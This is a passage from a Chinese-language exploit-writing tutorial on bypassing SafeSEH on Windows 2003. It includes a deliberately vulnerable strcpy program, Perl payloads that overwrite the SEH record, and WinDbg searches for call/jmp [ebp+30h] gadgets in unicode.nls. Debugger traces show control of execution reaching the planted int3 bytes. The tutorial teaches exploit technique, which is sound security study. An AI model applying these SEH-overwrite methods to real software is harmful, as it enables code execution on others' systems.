004010cb ff5530 call dword ptr [ebp+30h]
004010ce ff6530 jmp dword ptr [ebp+30h]
现在我们尝试在加载模块之外的地址空间找到包含这样指令的地址，如果能找到，我们就成功了。
为了对这进行演示，我们将使用前边解释/GS的时候用的那份代码，并尝试在 Windows 2003 Server R2
SP2 英文正式版上编写一个exploit。
#include "stdafx.h"
#include "stdio.h"
#include "windows.h"
void GetInput(char* str, char* out)
{
char buffer[500];
try
{
strcpy(buffer,str);
strcpy(out,buffer);
printf("Input received : %s\n",buffer);
}
catch (char * strErr)
{
printf("No valid input received ! \n");
printf("Exception : %s\n",strErr);
}
}
int main(int argc, char* argv[])
{
char buf2[128];
GetInput(argv[1],buf2);
return 0;
}
这次，我们编译的时候不启用 /GS 和/RTC，但启用 safeseh 机制(设置“linker”命令行参数
/safeseh:yes)，注意:我们运行在Windows 2003 Server R2 SP2 英文正式版上，设置DEP模式为OptIn
（不是默认设置，而只对系统核心进程进行保护，不用担心 – 我们将在稍后讨论DEP/NX）。
用ollydbg加载执行文件，我们看到所有的模块和执行映像都启用了safeseh保护。
我们将在508字节后覆盖到异常处理器，所以下边的代码可以用 BBBB覆盖next_seh，用DDDD覆盖异常
处理器:
my $size=508;
$junk="A" x $size;
$junk=$junk."BBBB";
$junk=$junk."DDDD";
system("\"C:\\Program Files\\Debugging Tools for Windows (x86)\\windbg\" seh
\"$junk\"\r\n");
Executable search path is:
ModLoad: 00400000 00406000 seh.exe
ModLoad: 7c800000 7c8c2000 ntdll.dll
ModLoad: 77e40000 77f42000 C:\WINDOWS\system32\kernel32.dll
ModLoad: 78520000 785c3000 C:\WINDOWS\WinSxS\x86_Microsoft.VC90…dll
(c5c.c64): Break instruction exception - code 80000003 (first chance)
eax=78600000 ebx=7ffdb000 ecx=00000005 edx=00000020 esi=7c8897f4 edi=00151f38
eip=7c81a3e1 esp=0012fb70 ebp=0012fcb4 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!DbgBreakPoint:
7c81a3e1 cc int 3
0:000> g
(c5c.c64): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0012fd41 ebx=00000000 ecx=0012fd41 edx=00130000 esi=00000001 edi=004033a8
eip=004010cb esp=0012fcb4 ebp=0012feec iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206
seh!GetInput+0xcb:
004010cb 8802 mov byte ptr [edx],al ds:0023:00130000=41
0:000> !exchain
0012fee0: 44444444
Invalid exception stack at 42424242
到现在为止，一切顺利，现在我们需要找到一个用于覆盖异常处理器的地址，所有模块（可执行的二进制）
都被safeseh保护，因此我们不能使用这些模块中的地址。
我们在内存中搜索指令call/jmp dword ptr[reg+nn],我们已经知道call dword ptr [ebp+0x30]的操作
码是ff 55 30, jmp dword ptr [ebp+0x30]的操作码是ff 65 30。
0:000> s 0100000 l 77fffff ff 55 30
00270b0b ff 55 30 00 00 00 00 9e-ff 57 30 00 00 00 00 9e .U0......W0.....
或者，你也可以使用我为 immunity 调试器写的 pvefindaddr命令插件，它可以帮助我们找到这样的地
址，!pvefindaddr jseh命令可以找出所有包含 call/jmp的指令，它只列出了加载模块范围之外的指令
地址。
（注意 – 上面的截图来自于另外的系统，请忽略其中的地址），如果你想得到这个插件：
pvefindaddr (ImmDbg pycommand)（登录之后下载）
此外，你也可以使用immunity或ollydbg调试器观察内存视图，你可以看到这个地址属于哪个区域。
你也可以使用Microsoft vadump tool 来转储虚拟地址空间。
继续回到搜索操作上来，如果你想找到更多类似指令（基本上是增加搜索范围），可以通过在搜索的时候
省略偏移(或使用immdbg的pvefindaddr插件，你将立刻得到所有结果):
0:000> s 0100000 l 77fffff ff 55
00267643 ff 55 ff 61 ff 54 ff 57-ff dc ff 58 ff cc ff f3 .U.a.T.W...X....
00270b0b ff 55 30 00 00 00 00 9e-ff 57 30 00 00 00 00 9e .U0......W0.....
002fbfd8 ff 55 02 02 02 56 02 02-03 56 02 02 04 56 02 02 .U...V...V...V..
00401183 ff 55 8b ec f6 45 08 02-57 8b f9 74 25 56 68 54 .U...E..W..t%VhT
0040149e ff 55 14 eb ed 8b 45 ec-89 45 e4 8b 45 e4 8b 00 .U....E..E..E...
00401509 ff 55 14 eb f0 c7 45 e4-01 00 00 00 c7 45 fc fe .U....E......E..
00401542 ff 55 8b ec 8b 45 08 8b-00 81 38 63 73 6d e0 75 .U...E....8csm.u
0040163e ff 55 8b ec ff 75 08 e8-4e ff ff ff f7 d8 1b c0 .U...u..N.......
004016b1 ff 55 8b ec 8b 4d 08 b8-4d 5a 00 00 66 39 01 74 .U...M..MZ..f9.t
004016f1 ff 55 8b ec 8b 45 08 8b-48 3c 03 c8 0f b7 41 14 .U...E..H g
(be8.bdc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0012fd41 ebx=00000000 ecx=0012fd41 edx=00130000 esi=00000001 edi=004033a8
eip=004010cb esp=0012fcb4 ebp=0012feec iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206
seh!GetInput+0xcb:
004010cb 8802 mov byte ptr [edx],al ds:0023:00130000=41
0:000> d ebp
0012feec 7c ff 12 00 79 11 40 00-f1 29 33 00 fc fe 12 00 |...y.@..)3.....
0012fefc 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012ff0c 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012ff1c 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012ff2c 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012ff3c 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012ff4c 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012ff5c 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
回到搜索结果上来，所有以0×004开始的地址不能使用（因为属于执行映像自己），仅有0×00270b0b 是
可用的…这个地址属于 unicode.nls（不属于任何加载模块），如果查看下各进程的地址空间
（svchost.exe, w3wp.exe, csrss.exe 等），你会发现 unicode.nls被映射到大多进程（并不是所有）
的不同地址，幸运的是，针对指定进程，基地址依然是静态的，对于控制台应用程序，它总是被映射为0 ×
00260000（在Windows 2003 Server R2英文正式版上，这个地址是相当稳定的，在Windows XP SP3英文
版上，它被映射为0×00270000（因此可以在XP SP3系统上使用地址0×00280b0b））
（再提一次，你可以使用我写的pvefindaddr命令，它可以自动完成所有工作）
现在我们需要解决的唯一问题是:我们在unicode.nls中找到的“call dword ptr[ebp+30h]”指令的地址
是以NULL字节开头的，并且输入的是 ascii（NULL字节是字符串结束符）（因此我们不能把 shellcode
布置在异常处理器的后边…但或许我们可以在SEH被覆盖之前就把shellcode布置到SEH结构的后边）。
如果是针对unicode漏洞的利用，这不会是一个问题（因为00 00 才是unicode字符串的结束符）。
我们用一些断点覆盖nextseh，并用0×00270b0b覆盖异常处理器。
$junk="A" x 508;
$junk=$junk."\xcc\xcc\xcc\xcc";
$junk=$junk.pack('V',0x00270b0b);
Executable search path is:
ModLoad: 00400000 00406000 seh.exe
ModLoad: 7c800000 7c8c2000 ntdll.dll
ModLoad: 77e40000 77f42000 C:\WINDOWS\system32\kernel32.dll
ModLoad: 78520000 785c3000 C:\WINDOWS\WinSxS\x86_Microsoft.VC90.CRT_1...dll
(a94.c34): Break instruction exception - code 80000003 (first chance)
eax=78600000 ebx=7ffdb000 ecx=00000005 edx=00000020 esi=7c8897f4 edi=00151f38
eip=7c81a3e1 esp=0012fb70 ebp=0012fcb4 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!DbgBreakPoint:
7c81a3e1 cc int 3
0:000> g
(a94.c34): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0012fd41 ebx=00000000 ecx=0012fd41 edx=00130000 esi=00000001 edi=004033a8
eip=004010cb esp=0012fcb4 ebp=0012feec iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206
seh!GetInput+0xcb:
004010cb 8802 mov byte ptr [edx],al ds:0023:00130000=41
0:000> !exchain
0012fee0: 00270b0b
Invalid exception stack at cccccccc
0:000> g
(a94.c34): Break instruction exception - code 80000003 (first chance)
eax=00000000 ebx=00000000 ecx=00270b0b edx=7c828786 esi=00000000 edi=00000000
eip=0012fee0 esp=0012f8e8 ebp=0012f90c iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246
0012fee0 cc int 3
0:000> d eip
0012fee0 cc cc cc cc 0b 0b 27 00-00 00 00 00 7c ff 12 00 ......'.....|...
0012fef0 79 11 40 00 f1 29 33 00-fc fe 12 00 41 41 41 41 y.@..)3.....AAAA
0012ff00 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012ff10 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012ff20 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012ff30 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012ff40 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012ff50 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0:000> d
0012ff60 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012ff70 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012ff80 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012ff90 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012ffa0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012ffb0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012ffc0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012ffd0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
这个新的（被控制的）SEH链表明我们已经成功改写了nseh和seh，异常传递给程序后，程序会跳转到四
字节的nseh中去继续执行（在这里是四个int 3）。
当异常发生时，我们步入跟踪，我们会看到ntdll中的验证例程被调用，该地址决定异常处理器是否有效
（call ntdll!RtlIsValidHandler)，最后异常处理器被执行，它让程序执行流到达nseh中（4个int 3）:
eax=00000000 ebx=00000000 ecx=00270b0b edx=7c828786 esi=00000000 edi=00000000
eip=7c828770 esp=0012f8f0 ebp=0012f90c iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246
ntdll!ExecuteHandler2+0x24:
7c828770 ffd1 call ecx {00270b0b}
0:000>
eax=00000000 ebx=00000000 ecx=00270b0b edx=7c828786 esi=00000000 edi=00000000
eip=00270b0b esp=0012f8ec ebp=0012f90c iopl=0 nv up ei pl zr na pe nc